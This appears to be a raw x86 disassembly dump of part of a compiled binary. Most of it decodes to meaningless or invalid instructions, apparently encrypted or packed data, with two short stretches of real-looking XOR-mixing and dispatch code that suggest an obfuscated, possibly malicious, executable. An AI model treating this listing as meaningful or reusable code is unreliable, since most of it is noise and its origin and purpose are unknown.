  40f746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f747:	inc    ebx
  40f748:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f749:	je     0x40f73f
  40f74b:	lea    ebp,[esi]
  40f74d:	sbb    al,0xe0
  40f74f:	mov    eax,ds:0x83ebe459
  40f754:	aas    
  40f755:	dec    edx
  40f756:	push   ss
  40f757:	ret    0x62e0
  40f75a:	inc    esp
  40f75b:	pop    es
  40f75c:	sti    
  40f75d:	push   0x847dabd
  40f762:	pop    eax
  40f763:	jmp    0x40f7a3
  40f765:	mov    cl,0x3c
  40f767:	xor    BYTE PTR [ecx+0x16],ah
  40f76a:	ss scas al,BYTE PTR es:[edi]
  40f76c:	push   ebp
  40f76d:	xchg   esp,eax
  40f76e:	in     al,dx
  40f76f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f770:	in     eax,0x3b
  40f772:	test   DWORD PTR [edx+edi*1-0x5c033d5c],ebp
  40f779:	leave  
  40f77a:	daa    
  40f77b:	sbb    ebp,ecx
  40f77d:	adc    BYTE PTR [ebx+0x4],bl
  40f780:	mov    ds:0xd4068df3,al
  40f785:	jbe    0x40f78a
  40f787:	jg     0x40f76a
  40f789:	jle    0x40f743
  40f78b:	or     al,0xd2
  40f78d:	test   BYTE PTR [ebx],dh
  40f78f:	pop    eax
  40f790:	or     esi,DWORD PTR ds:0xc4ff57ea
  40f796:	push   edi
  40f797:	adc    dh,BYTE PTR [ecx-0x3c]
  40f79a:	sbb    eax,0xeee79841
  40f79f:	cli    
  40f7a0:	stos   BYTE PTR es:[edi],al
  40f7a1:	jb     0x40f768
  40f7a3:	imul   esi,DWORD PTR [esi-0x3a],0x30
  40f7a7:	arpl   WORD PTR [eax-0x744ac33e],bp
  40f7ad:	or     BYTE PTR [ebx+edi*2+0x78],al
  40f7b1:	lock jbe 0x40f7eb
  40f7b4:	stos   DWORD PTR es:[edi],eax
  40f7b5:	inc    edi
  40f7b6:	sti    
  40f7b7:	rcl    eax,0xc7
  40f7ba:	pop    ebx
  40f7bb:	aaa    
  40f7bc:	out    dx,eax
  40f7bd:	out    dx,al
  40f7be:	sub    bh,bh
  40f7c0:	(bad)  
  40f7c1:	jmp    0x64f5317
  40f7c6:	int3   
  40f7c7:	out    dx,eax
  40f7c8:	push   es
  40f7c9:	nop
  40f7ca:	mov    es,WORD PTR [eax+0xa]
  40f7cd:	in     eax,dx
  40f7ce:	sub    bl,0x3a
  40f7d1:	mov    dh,ch
  40f7d3:	pusha  
  40f7d4:	test   DWORD PTR [edx+eiz*2-0x47],eax
  40f7d8:	push   esp
  40f7d9:	push   ecx
  40f7da:	fisub  DWORD PTR [edi+eax*2]
  40f7dd:	mov    edi,gs
  40f7df:	mov    esp,0xa66f5dfa
  40f7e4:	push   ecx
  40f7e5:	retf   0xf4b0
  40f7e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7e9:	neg    DWORD PTR [eax]
  40f7eb:	push   es
  40f7ec:	ficomp DWORD PTR [edi+eax*1-0x40dbc1e6]
  40f7f3:	push   ebx
  40f7f4:	dec    esp
  40f7f5:	jmp    0x40f78e
  40f7f7:	push   esi
  40f7f8:	out    dx,eax
  40f7f9:	and    eax,0x2b940882
  40f7fe:	or     al,0x14
  40f800:	dec    edx
  40f801:	lds    esi,FWORD PTR [ebx-0x2a]
  40f804:	dec    esp
  40f805:	adc    eax,0x7a6586b0
  40f80a:	push   esi
  40f80b:	xor    eax,0x41f4886e
  40f810:	std    
  40f811:	or     bh,al
  40f813:	sbb    eax,0xaf733231
  40f818:	lods   al,BYTE PTR ds:[esi]
  40f819:	fadd   QWORD PTR [ecx]
  40f81b:	push   ebp
  40f81c:	popf   
  40f81d:	(bad)  
  40f81e:	lods   al,BYTE PTR ds:[esi]
  40f81f:	add    dl,dl
  40f821:	jg     0x40f889
  40f823:	sub    al,0xa0
  40f825:	mov    ah,0x6a
  40f827:	(bad)  
  40f828:	sbb    edi,edi
  40f82a:	add    esi,DWORD PTR [ecx]
  40f82c:	jo     0x40f828
  40f82e:	sub    bl,dl
  40f830:	pop    eax
  40f831:	or     eax,0x173b5db1
  40f836:	test   eax,0xdbafa0ad
  40f83b:	push   edx
  40f83c:	pop    edx
  40f83d:	pop    edi
  40f83e:	icebp  
  40f83f:	sti    
  40f840:	in     al,dx
  40f841:	jg     0x40f839
  40f843:	ds aad 0xf7
  40f846:	push   0x653bea0
  40f84b:	fs push 0xf
  40f84e:	sbb    DWORD PTR [eax-0xe],ebp
  40f851:	or     esi,esi
  40f853:	jno    0x40f835
  40f855:	(bad)  [edi-0x4a]
  40f858:	jae    0x40f8b4
  40f85a:	mov    bh,0xb
  40f85c:	pop    eax
  40f85d:	mov    al,ds:0xa8c5bf3
  40f862:	wrmsr  
  40f864:	push   ds
  40f865:	out    dx,eax
  40f866:	dec    edx
  40f867:	xchg   edi,eax
  40f868:	lods   al,BYTE PTR ds:[esi]
  40f869:	lahf   
  40f86a:	je     0x40f8dc
  40f86c:	fld    TBYTE PTR [edx+esi*1]
  40f86f:	mov    ch,0x51
  40f871:	dec    eax
  40f872:	or     DWORD PTR [esi-0x21ab4494],edx
  40f878:	cli    
  40f879:	mov    dh,0x90
  40f87b:	jl     0x40f88a
  40f87d:	adc    al,0xb1
  40f87f:	adc    edx,edx
  40f881:	or     ecx,DWORD PTR [ebx]
  40f883:	aad    0x69
  40f885:	mov    al,0xd7
  40f887:	xchg   ecx,eax
  40f888:	push   edx
  40f889:	in     al,dx
  40f88a:	inc    ecx
  40f88b:	popf   
  40f88c:	adc    ah,BYTE PTR ds:0x56aa2608
  40f892:	pop    esp
  40f893:	ds ds sub bl,ch
  40f897:	pop    es
  40f898:	xchg   ebx,eax
  40f899:	inc    ebp
  40f89a:	dec    eax
  40f89b:	repz popf 
  40f89d:	mov    ebp,0xf2dd1c01
  40f8a2:	mov    eax,ds:0x5a707ab9
  40f8a7:	sbb    BYTE PTR [eax],0x7f
  40f8aa:	test   al,0x39
  40f8ac:	mov    edi,0x3d0e4bc7
  40f8b1:	rol    esp,0x59
  40f8b4:	mov    bh,0x6
  40f8b6:	jo     0x40f8bb
  40f8b8:	lea    ebx,[esi-0x560b145c]
  40f8be:	std    
  40f8bf:	ficom  WORD PTR [eax+0x4e7b004]
  40f8c5:	xchg   ebx,eax
  40f8c6:	sub    al,BYTE PTR [edx+edx*4+0x5c]
  40f8ca:	dec    ecx
  40f8cb:	call   0xe9b1db13
  40f8d0:	jbe    0x40f888
  40f8d2:	jl     0x40f85c
  40f8d4:	(bad)  
  40f8d5:	popa   
  40f8d6:	pop    ebp
  40f8d7:	cld    
  40f8d8:	adc    edi,DWORD PTR ds:0x589c6765
  40f8de:	int3   
  40f8df:	jmp    0x40f86a
  40f8e1:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  40f8e7:	or     al,0x81
  40f8e9:	xor    eax,0x4346bf
  40f8ee:	dec    edi
  40f8ef:	inc    edi
  40f8f0:	inc    ebx
  40f8f1:	add    BYTE PTR [ebx],dh
  40f8f3:	mov    DWORD PTR [ebx],0xb05c7c6
  40f8f9:	inc    edi
  40f8fa:	inc    ebx
  40f8fb:	add    BYTE PTR [ebx+0x3b00004b],ch
  40f901:	rol    edi,0x5
  40f904:	pop    DWORD PTR [edi+0x43]
  40f907:	add    BYTE PTR [ebx+0x3e],dl
  40f90a:	add    BYTE PTR [eax],al
  40f90c:	je     0x40fd56
  40f912:	and    DWORD PTR ds:0x434713,edi
  40f918:	mov    eax,DWORD PTR [ebp-0x4]
  40f91b:	mov    edx,DWORD PTR ds:0x43466b
  40f921:	xor    DWORD PTR ds:0x4346d3,edx
  40f927:	xor    eax,edi
  40f929:	and    DWORD PTR ds:0x43473f,0x0
  40f933:	mov    edx,DWORD PTR ds:0x43473f
  40f939:	inc    edx
  40f93a:	mov    DWORD PTR ds:0x43473f,edx
  40f940:	cmp    DWORD PTR ds:0x43473f,0x9
  40f947:	jne    0x40f96a
  40f94d:	push   0x4346cb
  40f952:	push   0x434812
  40f957:	push   0x7b5f
  40f95c:	push   0x5aad
  40f961:	push   DWORD PTR [ebp-0xc]
  40f964:	call   DWORD PTR ds:0x4132a4
  40f96a:	cmp    DWORD PTR ds:0x43473f,0x8
  40f971:	jne    0x40f986
  40f977:	xor    edx,edx
  40f979:	xor    edx,DWORD PTR ds:0x43473f
  40f97f:	inc    edx
  40f980:	mov    DWORD PTR ds:0x43473f,edx
  40f986:	cmp    DWORD PTR ds:0x43473f,0x10
  40f98d:	jb     0x40f933
  40f993:	and    DWORD PTR ds:0x43473f,edx
  40f999:	add    eax,esi
  40f99b:	push   eax
  40f99c:	push   DWORD PTR [ebp-0x8]
  40f99f:	push   DWORD PTR [ebp-0x4]
  40f9a2:	mov    edx,DWORD PTR ds:0x414afe
  40f9a8:	jmp    0x40fd3b
  40f9ad:	pop    ebx
  40f9ae:	pop    edi
  40f9af:	cld    
  40f9b0:	sub    edi,esp
  40f9b2:	mov    ebp,0x81a66f6d
  40f9b7:	push   esi
  40f9b8:	in     eax,dx
  40f9b9:	sub    DWORD PTR [esi],esp
  40f9bb:	add    DWORD PTR [eax+0x14],edx
  40f9be:	mov    ebp,0x79f47e7e
  40f9c3:	jle    0x40fa43
  40f9c5:	loop   0x40fa18
  40f9c7:	add    bh,BYTE PTR [esi-0x7fd6b6b4]
  40f9cd:	stc    
  40f9ce:	ret    0x1879
  40f9d1:	jns    0x40f99d
  40f9d3:	(bad)  
  40f9d4:	fiadd  WORD PTR [ebx-0x5d]
  40f9d7:	sub    ch,BYTE PTR [edi+ecx*1-0x15]
  40f9db:	push   edx
  40f9dc:	push   es
  40f9dd:	xchg   ebp,eax
  40f9de:	fld    QWORD PTR [esi+0x67f4dcd0]
  40f9e4:	outs   dx,DWORD PTR ds:[esi]
  40f9e5:	dec    ecx
  40f9e6:	jmp    0x40fa39
  40f9e8:	call   edx
  40f9ea:	iret   
  40f9eb:	(bad)  
  40f9ec:	ja     0x40f9b4
  40f9ee:	xchg   ebp,eax
  40f9ef:	pop    ebx
  40f9f0:	add    ebx,DWORD PTR [eax+0x50]
  40f9f3:	sub    eax,0x6dd7a73f
  40f9f8:	loopne 0x40f9c3
  40f9fa:	and    ecx,DWORD PTR [ecx]
  40f9fc:	out    0x90,eax
  40f9fe:	pop    esp
  40f9ff:	sti    
  40fa00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa01:	push   ebx
  40fa02:	les    esi,FWORD PTR [edx]
  40fa04:	mov    ebx,DWORD PTR [edx-0x1827e312]
  40fa0a:	pop    edi
  40fa0b:	or     dh,cl
  40fa0d:	add    edi,edi
  40fa0f:	push   0x8ab228ae
  40fa14:	or     BYTE PTR [ebp+0x4a],dl
  40fa17:	xchg   esp,eax
  40fa18:	div    DWORD PTR [edi]
  40fa1a:	jl     0x40f9bc
  40fa1c:	sbb    ebx,DWORD PTR [ebx]
  40fa1e:	out    0x71,eax
  40fa20:	sar    BYTE PTR [edx],cl
  40fa22:	pop    edx
  40fa23:	pushf  
  40fa24:	xchg   bl,dl
  40fa26:	rcr    edx,cl
  40fa28:	sahf   
  40fa29:	jnp    0x40fa7b
  40fa2b:	mov    ecx,0x24461249
  40fa30:	xor    eax,0x6276cf9b
  40fa35:	pop    bp
  40fa37:	mov    ds:0x50689141,al
  40fa3c:	cmp    BYTE PTR [edx],bh
  40fa3e:	ds xchg esi,eax
  40fa40:	dec    ecx
  40fa41:	enter  0xefd,0xb5
  40fa45:	addr16 in eax,dx
  40fa47:	scas   eax,DWORD PTR es:[edi]
  40fa48:	int3   
  40fa49:	cmp    BYTE PTR [ecx+0x66e5e96f],cl
  40fa4f:	scas   al,BYTE PTR es:[edi]
  40fa50:	(bad)  
  40fa51:	xor    eax,0x4e1e26fa
  40fa56:	jmp    0xeedc8e84
  40fa5b:	lahf   
  40fa5c:	pop    esp
  40fa5d:	fldcw  WORD PTR [eax-0x36]
  40fa60:	xchg   esi,eax
  40fa61:	mov    ecx,0xf3aeb8ae
  40fa66:	xchg   edi,eax
  40fa67:	add    edx,edi
  40fa69:	pop    eax
  40fa6a:	lahf   
  40fa6b:	sbb    al,0x20
  40fa6d:	pop    ss
  40fa6e:	jl     0x40faec
  40fa70:	push   ecx
  40fa71:	inc    edi
  40fa72:	sub    DWORD PTR [ecx+0x1d],ebp
  40fa75:	cmc    
  40fa76:	test   DWORD PTR ss:[ebp-0x77],ebp
  40fa7a:	jne    0x40fa21
  40fa7c:	cmp    BYTE PTR [ebx-0x4f],0x92
  40fa80:	ins    DWORD PTR es:[edi],dx
  40fa81:	call   0x8f3f6816
  40fa86:	mov    ch,0x42
  40fa88:	retf   
  40fa89:	loopne 0x40facf
  40fa8b:	and    bl,BYTE PTR [esi+0x3b72cf7b]
  40fa91:	hlt    
  40fa92:	inc    ebx
  40fa93:	mov    WORD PTR [esi+0x3b],?
  40fa96:	cmp    esi,DWORD PTR [ebx+ecx*2+0x5c9b05e2]
  40fa9d:	inc    ebx
  40fa9e:	mov    ebp,0xf426561e
  40faa3:	call   0x724f8cbf
  40faa8:	cli    
  40faa9:	cdq    
  40faaa:	js     0x40faa0
  40faac:	jecxz  0x40fa42
  40faae:	cli    
  40faaf:	out    0xab,eax
  40fab1:	fldenv [ebp+0xe]
  40fab4:	mov    es,WORD PTR [esi*8+0x1637a279]
  40fabb:	jb     0x40fa5f
  40fabd:	ror    DWORD PTR [esi],0x5
  40fac0:	mov    ds:0x95dabba7,al
  40fac5:	arpl   WORD PTR [edx],sp
  40fac7:	cmp    DWORD PTR [ebp+ebp*2+0x4aa5ea42],esi
  40face:	pushf  
  40facf:	mov    ebp,0x27689f98
  40fad4:	mov    edi,0x91ff8c99
  40fad9:	mov    edi,0x1f0b5502
  40fade:	nop
  40fadf:	or     cl,bh
  40fae1:	ss mov dh,0x9f
  40fae4:	scas   al,BYTE PTR es:[edi]
  40fae5:	test   ebx,0xb57c1ee3
  40faeb:	(bad)  
  40faec:	in     al,dx
  40faed:	xchg   ecx,eax
  40faee:	cli    
  40faef:	mov    dl,0x34
  40faf1:	outs   dx,BYTE PTR ds:[esi]
  40faf2:	or     bl,BYTE PTR [esi+0x16]
  40faf5:	dec    ebx
  40faf6:	out    0x93,al
  40faf8:	out    dx,eax
  40faf9:	sar    BYTE PTR [edi],1
  40fafb:	popf   
  40fafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fafd:	cmp    BYTE PTR [edi],dh
  40faff:	pusha  
  40fb00:	xlat   BYTE PTR ds:[ebx]
  40fb01:	out    0x75,eax
  40fb03:	jne    0x40fb11
  40fb05:	mov    esi,0x856ea5f2
  40fb0a:	aam    0xda
  40fb0c:	and    DWORD PTR [ebx],edx
  40fb0e:	mov    cl,BYTE PTR [edi]
  40fb10:	cmp    ch,dh
  40fb12:	push   0xd4c65095
  40fb17:	cmp    DWORD PTR [ecx-0x5b8554a],esi
  40fb1d:	lods   eax,DWORD PTR ds:[esi]
  40fb1e:	jge    0x40fb50
  40fb20:	gs or  ch,ch
  40fb23:	sub    al,BYTE PTR [edi+ebp*4+0xc66eefc]
  40fb2a:	fnstcw WORD PTR [ebx+0x5e]
  40fb2d:	inc    edx
  40fb2e:	jne    0x40faec
  40fb30:	ret    
  40fb31:	mov    ds:0xf0cb0d3,al
  40fb36:	out    0x11,al
  40fb38:	pop    edx
  40fb39:	lahf   
  40fb3a:	(bad)  [ebp-0x49031889]
  40fb40:	xor    BYTE PTR [ebx+0x74],dl
  40fb43:	and    al,0xf4
  40fb45:	or     edx,ecx
  40fb47:	sbb    eax,0x9cacbbb4
  40fb4c:	ret    0x6dc4
  40fb4f:	retf   0x996d
  40fb52:	lods   eax,DWORD PTR ds:[esi]
  40fb53:	sub    eax,0xe38d9603
  40fb58:	sahf   
  40fb59:	jg     0x40fb5c
  40fb5b:	fidiv  DWORD PTR [edx]
  40fb5d:	ins    BYTE PTR es:[edi],dx
  40fb5e:	leave  
  40fb5f:	call   0x205f1742
  40fb64:	xchg   ebp,eax
  40fb65:	in     eax,dx
  40fb66:	enter  0xfb7d,0x51
  40fb6a:	retf   0xf47e
  40fb6d:	pop    ebx
  40fb6e:	sahf   
  40fb6f:	out    dx,eax
  40fb70:	dec    esi
  40fb71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb72:	mov    dh,BYTE PTR [ebp+0x9]
  40fb75:	push   ss
  40fb76:	jg     0x40fb6c
  40fb78:	pop    esp
  40fb79:	pusha  
  40fb7a:	jg     0x40fb6e
  40fb7c:	dec    edi
  40fb7d:	mov    eax,ds:0x986f52b6
  40fb82:	add    BYTE PTR [ebp+0x3d60c853],0x98
  40fb89:	int3   
  40fb8a:	mov    cl,dl
  40fb8c:	dec    esp
  40fb8d:	(bad)  
  40fb8e:	jne    0x40fbd4
  40fb90:	int3   
  40fb91:	(bad)  
  40fb92:	in     eax,0xc8
  40fb94:	test   ebp,ebx
  40fb96:	push   edi
  40fb97:	imul   ebx,ecx,0xffffffd5
  40fb9a:	jo     0x40fb95
  40fb9c:	mov    ecx,0x1b218fa6
  40fba1:	add    eax,0x39bc79e4
  40fba6:	js     0x40fbb7
  40fba8:	dec    esp
  40fba9:	add    dh,BYTE PTR [ebp+0x7d7457fa]
  40fbaf:	sbb    BYTE PTR [esp+ebx*8-0x2cda86e9],dl
  40fbb6:	fdecstp 
  40fbb8:	dec    ebx
  40fbb9:	mov    bl,0x66
  40fbbb:	mov    dl,0x5d
  40fbbd:	fstp   DWORD PTR [edx*8-0x12d5160]
  40fbc4:	fwait
  40fbc5:	and    al,0xbe
  40fbc7:	sub    dh,BYTE PTR [edi+0x65]
  40fbca:	ficom  WORD PTR [ebp-0x4b7e4377]
  40fbd0:	dec    eax
  40fbd1:	rcr    DWORD PTR [ecx+0x7b],0x6c
  40fbd5:	in     al,0xe6
  40fbd7:	dec    edx
  40fbd8:	rcr    DWORD PTR [ebx+0x2e0a7cb8],1
  40fbde:	imul   ebx,DWORD PTR [eax-0x4953bef8],0x3e
  40fbe5:	idiv   DWORD PTR [eax+0x52]
  40fbe8:	js     0x40fba1
  40fbea:	fcom   QWORD PTR [edi-0x1c]
  40fbed:	les    ebx,FWORD PTR [esi-0x57]
  40fbf0:	sub    al,0x5d
  40fbf2:	fsub   DWORD PTR [eax+0x2e]
  40fbf5:	jle    0x40fc4b
  40fbf7:	jb     0x40fbe2
  40fbf9:	mov    esp,0x3353791c
  40fbfe:	ins    DWORD PTR es:[edi],dx
  40fbff:	popa   
  40fc00:	sub    eax,0xadbe928
  40fc05:	sti    
  40fc06:	fcomp  DWORD PTR [edi]
  40fc08:	std    
  40fc09:	mov    eax,0x2ced0fd9
  40fc0e:	int    0x81
  40fc10:	xchg   esp,eax
  40fc11:	dec    esi
  40fc12:	dec    eax
  40fc13:	push   eax
  40fc14:	aaa    
  40fc15:	shr    edi,1
  40fc17:	mov    gs,WORD PTR [ecx-0x63]
  40fc1a:	lods   eax,DWORD PTR ds:[esi]
  40fc1b:	inc    esp
  40fc1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc1d:	dec    ebx
  40fc1e:	and    ebp,DWORD PTR [edi+0x7]
  40fc21:	dec    edx
  40fc22:	pop    edi
  40fc23:	mov    bh,dh
  40fc25:	xchg   ebx,eax
  40fc26:	push   0x5a
  40fc28:	and    esp,0x43
  40fc2b:	iret   
  40fc2c:	mov    bh,0xd0
  40fc2e:	shr    esp,1
  40fc30:	sub    al,BYTE PTR [eax]
  40fc32:	jge    0x40fbd7
  40fc34:	call   0x3905:0x42c7d40b
  40fc3b:	push   eax
  40fc3c:	retf   
  40fc3d:	mov    cl,0x38
  40fc3f:	push   ebx
  40fc40:	push   ds
  40fc41:	mov    ch,0xa9
  40fc43:	add    eax,0x71577653
  40fc48:	inc    esi
  40fc49:	call   0xb20adc87
  40fc4e:	xor    edi,esi
  40fc50:	cmp    edi,DWORD PTR [edi+0x7c]
  40fc53:	xchg   BYTE PTR [ecx-0x646cdd17],bl
  40fc59:	lods   eax,DWORD PTR ds:[esi]
  40fc5a:	frstor [ebx]
  40fc5c:	sbb    al,BYTE PTR [esi+esi*4]
  40fc5f:	jne    0x40fc0f
  40fc61:	mov    al,0x8d
  40fc63:	inc    edx
  40fc64:	jbe    0x40fc1c
  40fc66:	xchg   ebx,eax
  40fc67:	test   DWORD PTR [edi+0x5e02bb20],eax
  40fc6d:	pop    edi
  40fc6e:	retf   0x90e2
  40fc71:	dec    ebx
  40fc72:	out    dx,eax
  40fc73:	ja     0x40fcea
  40fc75:	loopne 0x40fc24
  40fc77:	adc    BYTE PTR [eax+0x7],0x40
  40fc7b:	iret   
  40fc7c:	add    al,cl
  40fc7e:	push   ebx
  40fc7f:	pop    ss
  40fc80:	jne    0x40fc3d
  40fc82:	dec    edi
  40fc83:	jnp    0x40fcc1
  40fc85:	xor    ecx,DWORD PTR [edi-0x72]
  40fc88:	jg     0x40fcd0
  40fc8a:	mov    edi,DWORD PTR [eax+0x4afbe3a8]
  40fc90:	js     0x40fc7c
  40fc92:	(bad)  
  40fc93:	mov    al,0x51
  40fc95:	(bad)  
  40fc96:	mov    eax,ds:0x6caa5949
  40fc9b:	mov    cl,0xbf
  40fc9d:	inc    eax
  40fc9e:	outs   dx,DWORD PTR fs:[esi]
  40fca0:	mov    ch,0x3e
  40fca2:	and    DWORD PTR [esi+edx*2],esp
  40fca5:	imul   eax,DWORD PTR [ebx+0x39],0xa7477c17
  40fcac:	mov    ds:0xf3fb10e8,al
  40fcb1:	or     al,0x51
  40fcb3:	shl    DWORD PTR [ecx],cl
  40fcb5:	dec    edx
  40fcb6:	mov    ebp,0x2d59d7f8
  40fcbb:	scas   al,BYTE PTR es:[di]
  40fcbd:	std    
  40fcbe:	mov    cl,0xfc
  40fcc0:	pop    edx
  40fcc1:	dec    ebx
  40fcc2:	add    DWORD PTR [ebx+0x70],0x6f
  40fcc6:	lock mov cl,0x84
  40fcc9:	out    dx,al
  40fcca:	cmp    edi,DWORD PTR [esi+0x19f8fe5e]
  40fcd0:	lea    ebx,[edi+eax*4+0x7f82eea5]
  40fcd7:	fstp   DWORD PTR [eax]
  40fcd9:	and    DWORD PTR [eax-0x29d01b0e],esi
  40fcdf:	dec    ebx
  40fce0:	dec    edx
  40fce1:	xchg   ebx,eax
  40fce2:	repnz add DWORD PTR [eax+0x21],0x5e
  40fce7:	pop    ecx
  40fce8:	mov    bh,0x58
  40fcea:	push   ds
  40fceb:	ret    0x6545
  40fcee:	sti    
  40fcef:	mov    bl,0x9e
  40fcf1:	jp     0x40fcd9
  40fcf3:	push   ebp
  40fcf4:	push   ss
  40fcf5:	xchg   edx,eax
  40fcf6:	inc    esp
  40fcf7:	jb     0x40fcef
  40fcf9:	addr16 pusha 
  40fcfb:	pusha  
  40fcfc:	cmc    
  40fcfd:	cmp    al,0xce
  40fcff:	ja     0x40fd12
  40fd01:	mov    eax,0x50376331
  40fd06:	and    eax,DWORD PTR [ecx]
  40fd08:	jp     0x40fce7
  40fd0a:	xor    eax,0xe3722c3b
  40fd0f:	hlt    
  40fd10:	xchg   ebp,eax
  40fd11:	aaa    
  40fd12:	cmp    al,0xef
  40fd14:	pop    ebp
  40fd15:	aad    0xb4
  40fd17:	mov    ds:0x1c534d4c,eax
  40fd1c:	jb     0x40fcd1
  40fd1e:	imul   edx,DWORD PTR [ebx+edi*2],0xffffff81
  40fd22:	out    dx,eax
  40fd23:	push   0x1ccc87cd
  40fd28:	add    BYTE PTR [ecx],dh
  40fd2a:	mov    esp,0xde031535
  40fd2f:	ficomp DWORD PTR [esp+ebp*8]
  40fd32:	loop   0x40fd4f
  40fd34:	loope  0x40fd84
  40fd36:	fimul  DWORD PTR [ebx]
  40fd38:	adc    al,0x45
  40fd3a:	outs   dx,DWORD PTR ds:[esi]
  40fd3b:	call   0x41098a
  40fd40:	mov    ecx,DWORD PTR ds:0x414afe
  40fd46:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40fd4c:	mov    DWORD PTR [ecx],eax
  40fd4e:	mov    eax,DWORD PTR [ebp-0x8]
  40fd51:	jmp    0x410121
  40fd56:	mov    eax,DWORD PTR [ebp-0x4]
  40fd59:	mov    ecx,DWORD PTR [ebp+0x10]
  40fd5c:	xor    eax,edi
  40fd5e:	add    eax,esi
  40fd60:	cmp    eax,ecx
  40fd62:	jne    0x41011e
  40fd68:	mov    eax,DWORD PTR [ebp-0x4]
  40fd6b:	xor    eax,edi
  40fd6d:	add    eax,esi
  40fd6f:	mov    ds:0x414b82,eax
  40fd74:	mov    eax,DWORD PTR [ebp-0x4]
  40fd77:	xor    eax,edi
  40fd79:	add    eax,esi
  40fd7b:	mov    ds:0x414b7a,eax
  40fd80:	push   DWORD PTR [ebp-0x8]
  40fd83:	push   DWORD PTR [ebp-0x4]
  40fd86:	call   0x408384
  40fd8b:	jmp    0x41011e
  40fd90:	in     eax,0x27
  40fd92:	ss xor bh,ah
  40fd95:	xor    esp,ebp
  40fd97:	icebp  
  40fd98:	add    DWORD PTR [eax+esi*4+0x77],edi
  40fd9c:	ror    BYTE PTR [edi-0x477d75bc],1
  40fda2:	jle    0x40fe22
  40fda4:	hlt    
  40fda5:	jns    0x40fe25
  40fda7:	jle    0x40fd5f
  40fda9:	or     edx,0xffffffa7
  40fdac:	sahf   
  40fdad:	iret   
  40fdae:	cmp    ebp,DWORD PTR [ebx+edi*4]
  40fdb1:	jnp    0x40fe01
  40fdb3:	test   ax,0x6c19
  40fdb7:	sub    ebx,DWORD PTR [eax-0x80]
  40fdba:	out    0x78,al
  40fdbc:	les    ebx,FWORD PTR [ebp-0x613014ba]
  40fdc2:	jo     0x40fd54
  40fdc4:	add    BYTE PTR [edi+0x70fd6708],dh
  40fdca:	dec    ebp
  40fdcb:	int3   
  40fdcc:	jae    0x40fde1
  40fdce:	xchg   esp,eax
  40fdcf:	in     al,dx
  40fdd0:	push   edi
  40fdd1:	les    esp,FWORD PTR [edi]
  40fdd3:	xor    esp,DWORD PTR [esi+ecx*1-0x19]
  40fdd7:	push   es
  40fdd8:	mov    ecx,0x88d29811
  40fddd:	test   al,0xf
  40fddf:	outs   dx,BYTE PTR ds:[esi]
  40fde0:	fsubr  QWORD PTR [edx-0x6]
  40fde3:	hlt    
  40fde4:	add    ebx,edx
  40fde6:	ss stc 
  40fde8:	jecxz  0x40fdc0
  40fdea:	jecxz  0x40fdc6
  40fdec:	stos   DWORD PTR es:[edi],eax
  40fded:	pop    eax
  40fdee:	jecxz  0x40fe4d
  40fdf0:	add    ebp,DWORD PTR [eax]
  40fdf2:	lods   eax,DWORD PTR ds:[esi]
  40fdf3:	mov    ebx,0x3cea89c9
  40fdf8:	mov    dl,0x3a
  40fdfa:	jg     0x40fdf3
  40fdfc:	mov    cl,0x57
  40fdfe:	mov    dh,0x5f
  40fe00:	data16 mov bh,0x67
  40fe03:	lods   eax,DWORD PTR ds:[esi]
  40fe04:	mov    ds:0x8b466ed,eax
  40fe09:	mov    BYTE PTR [edx+0x71],cl
  40fe0c:	jecxz  0x40fdcc
  40fe0e:	cs push edx
  40fe10:	pop    esi
  40fe11:	ds sti 
  40fe13:	xchg   ebx,eax
  40fe14:	jp     0x40fdb5
  40fe16:	cmc    
  40fe17:	mov    edi,0xb159e593
  40fe1c:	push   0x42
  40fe1e:	inc    esi
  40fe1f:	push   esp
  40fe20:	outs   dx,BYTE PTR ds:[esi]
  40fe21:	push   ecx
  40fe22:	retf   0xab8e
  40fe25:	xchg   ecx,eax
  40fe26:	enter  0x5f8d,0xd9
  40fe2a:	test   esi,0xa74489b6
  40fe30:	out    dx,al
  40fe31:	xchg   dh,bl
  40fe33:	out    dx,al
  40fe34:	xchg   BYTE PTR [ecx-0x68],ah
  40fe37:	push   ebx
  40fe38:	shl    BYTE PTR [esi+0x5f76e6c],0x7b
  40fe3f:	dec    ebx
  40fe40:	lods   al,BYTE PTR ds:[esi]
  40fe41:	xor    edi,DWORD PTR [eax+0x2e1ba2d1]
  40fe47:	stos   BYTE PTR es:[edi],al
  40fe48:	les    ebp,FWORD PTR [edi+0x61760f06]
  40fe4e:	mov    bl,0xf1
  40fe50:	lds    ebx,FWORD PTR [esi-0x3b]
  40fe53:	push   cs
  40fe54:	(bad)  
  40fe55:	sbb    ebp,DWORD PTR [edx+edx*4]
  40fe58:	rcr    eax,cl
  40fe5a:	sbb    al,0x58
  40fe5c:	stc    
  40fe5d:	push   edi
  40fe5e:	jbe    0x40fe86
  40fe60:	imul   ebx,DWORD PTR [edi-0x2f1cbb5f],0xe6ffc3a5
  40fe6a:	inc    esi
  40fe6b:	psadbw mm6,QWORD PTR [ebx-0x12]
  40fe6f:	(bad)  
  40fe70:	icebp  
  40fe71:	je     0x40fe2f
  40fe73:	out    0xd1,eax
  40fe75:	push   edx
  40fe76:	shl    DWORD PTR [edx+0x53],0xc7
  40fe7a:	call   0x8ab8:0xeb20cd68
  40fe81:	cwde   
  40fe82:	mov    al,ds:0x454c6a47
  40fe87:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe88:	xor    BYTE PTR [edx-0x64aa0bb4],dl
  40fe8e:	inc    edi
  40fe8f:	sub    BYTE PTR [edi+0xa],ch
  40fe92:	mul    DWORD PTR [edx]
  40fe94:	nop
  40fe95:	pop    edi
  40fe96:	jmp    0x3c3117c5
  40fe9b:	and    al,0x52
  40fe9d:	adc    eax,0xfab36349
  40fea2:	cmp    BYTE PTR [esi+0x2b6adf20],dh
  40fea8:	out    dx,eax
  40fea9:	xchg   esi,eax
  40feaa:	push   ds
  40feab:	cli    
  40feac:	stos   DWORD PTR es:[edi],eax
